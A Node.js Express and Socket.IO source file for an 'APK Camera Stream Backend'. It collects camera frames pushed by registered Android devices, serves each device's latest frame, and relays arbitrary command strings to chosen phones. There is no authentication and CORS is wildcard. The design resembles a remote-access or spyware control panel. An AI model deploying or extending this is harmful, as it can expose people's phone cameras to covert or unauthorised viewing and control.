const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// ============================================
// STORAGE - Connected Devices & Frames
// ============================================
let connectedDevices = [];
let latestFrames = {};  // Har device ka latest frame store hoga

// ============================================
// MIDDLEWARE
// ============================================
app.use(express.json());

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  next();
});

// ============================================
// ============ APIs for Vercel ===============
// ============================================

// 1. Sabhi connected devices ki list
app.get('/api/devices', (req, res) => {
  const devicesList = connectedDevices.map(device => ({
    device_id: device.id,
    device_name: device.device_name,
    status: "online",
    connected_at: device.connected_at
  }));
  
  res.json({
    success: true,
    total: connectedDevices.length,
    devices: devicesList
  });
});

// 2. MJPEG FRAME ENDPOINT (Vercel yehi use karega stream dikhane ke liye) 🔴 IMPORTANT
app.get('/api/frame.jpg', (req, res) => {
  const deviceId = req.query.device_id;
  
  if (!deviceId) {
    return res.status(400).send('device_id missing');
  }
  
  const frame = latestFrames[deviceId];
  
  if (!frame || !frame.data) {
    return res.status(404).send('No frame available');
  }
  
  // Base64 se image buffer me convert
  let base64Data = frame.data;
  if (base64Data.includes(',')) {
    base64Data = base64Data.split(',')[1];
  }
  
  const imgBuffer = Buffer.from(base64Data, 'base64');
  
  res.writeHead(200, {
    'Content-Type': 'image/jpeg',
    'Content-Length': imgBuffer.length,
    'Cache-Control': 'no-cache, no-store, must-revalidate',
    'Pragma': 'no-cache',
    'Expires': '0'
  });
  res.end(imgBuffer);
});

// 3. Specific device ka status
app.get('/api/device-status', (req, res) => {
  const deviceId = req.query.device_id;
  const device = connectedDevices.find(d => d.id === deviceId);
  
  if (device) {
    res.json({
      success: true,
      is_online: true,
      device_id: device.id,
      device_name: device.device_name,
      dot: "🟢"
    });
  } else {
    res.json({
      success: true,
      is_online: false,
      device_id: deviceId,
      dot: "🔴"
    });
  }
});

// 4. Command send (specific device ko)
app.get('/api/command', (req, res) => {
  const command = req.query.cmd;
  const deviceId = req.query.device_id;
  
  if (!deviceId) {
    return res.json({ success: false, error: "No device selected" });
  }
  
  const targetDevice = connectedDevices.find(d => d.id === deviceId);
  
  if (targetDevice) {
    io.to(targetDevice.socket_id).emit('command', command);
    console.log(`🎮 Command '${command}' → ${targetDevice.device_name}`);
    
    res.json({
      success: true,
      command: command,
      sent_to: targetDevice.device_name,
      device_id: deviceId
    });
  } else {
    res.json({
      success: false,
      error: `Device ${deviceId} not found or offline`
    });
  }
});

// 5. Quality change (specific device ko)
app.get('/api/quality', (req, res) => {
  const quality = req.query.quality;
  const deviceId = req.query.device_id;
  
  if (!deviceId || !quality) {
    return res.json({ success: false, error: "Missing device or quality" });
  }
  
  const targetDevice = connectedDevices.find(d => d.id === deviceId);
  
  if (targetDevice) {
    io.to(targetDevice.socket_id).emit('quality', quality);
    console.log(`🎥 Quality '${quality}' → ${targetDevice.device_name}`);
    
    res.json({
      success: true,
      quality: quality,
      sent_to: targetDevice.device_name
    });
  } else {
    res.json({ success: false, error: "Device not found" });
  }
});

// 6. Home endpoint
app.get('/', (req, res) => {
  res.json({
    message: "APK Camera Stream Backend is Running",
    version: "1.0",
    online_devices: connectedDevices.length,
    devices: connectedDevices.map(d => ({ id: d.id, name: d.device_name })),
    endpoints: {
      devices: "/api/devices",
      frame: "/api/frame.jpg?device_id=xxx",
      command: "/api/command?cmd=xxx&device_id=xxx",
      quality: "/api/quality?quality=xxx&device_id=xxx",
      status: "/api/device-status?device_id=xxx"
    }
  });
});

// ============================================
// ============ WEBSOCKET (APK Connection) ============
// ============================================

io.on('connection', (socket) => {
  console.log('✅ New APK connection:', socket.id);
  
  let currentDevice = null;
  
  // APK register hota hai
  socket.on('register_device', (data) => {
    const deviceId = data.device_id || data.device || socket.id;
    const deviceName = data.device_name || data.model || "Android Phone";
    
    currentDevice = {
      id: deviceId,
      device_name: deviceName,
      socket_id: socket.id,
      connected_at: new Date().toISOString()
    };
    
    // Pehle se connected hai to remove karo
    connectedDevices = connectedDevices.filter(d => d.id !== deviceId);
    connectedDevices.push(currentDevice);
    
    console.log(`\n📱 DEVICE CONNECTED:`);
    console.log(`   Name: ${deviceName}`);
    console.log(`   ID: ${deviceId}`);
    console.log(`   Total online: ${connectedDevices.length}`);
  });
  
  // 🔴 APK se FRAME aaya - YAHAN STORE HOTA HAI 🔴
  socket.on('frame', (frameData) => {
    if (currentDevice) {
      latestFrames[currentDevice.id] = {
        data: frameData,
        time: Date.now()
      };
    }
  });
  
  // Heartbeat
  socket.on('heartbeat', (data) => {
    if (currentDevice) {
      // Update last seen time if needed
      console.log(`💓 Heartbeat from ${currentDevice.device_name}`);
    }
  });
  
  // Disconnect
  socket.on('disconnect', () => {
    if (currentDevice) {
      console.log(`\n🔴 DEVICE DISCONNECTED:`);
      console.log(`   Name: ${currentDevice.device_name}`);
      console.log(`   ID: ${currentDevice.id}`);
      
      connectedDevices = connectedDevices.filter(d => d.id !== currentDevice.id);
      delete latestFrames[currentDevice.id];
      
      console.log(`   Total online: ${connectedDevices.length}`);
    }
  });
});

// ============================================
// START SERVER
// ============================================
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`
  ═══════════════════════════════════════════════════════
  🚀 APK CAMERA STREAM BACKEND - SERVER STARTED
  ═══════════════════════════════════════════════════════
  
  📡 Port: ${PORT}
  🌐 URL: https://your-project.repl.co
  
  ✅ APIs Working:
     GET /api/devices
     GET /api/frame.jpg?device_id=xxx  ← MJPEG Stream
     GET /api/command?cmd=xxx&device_id=xxx
     GET /api/quality?quality=xxx&device_id=xxx
     GET /api/device-status?device_id=xxx
  
  🔌 WebSocket: Active
  
  ═══════════════════════════════════════════════════════
  `);
});
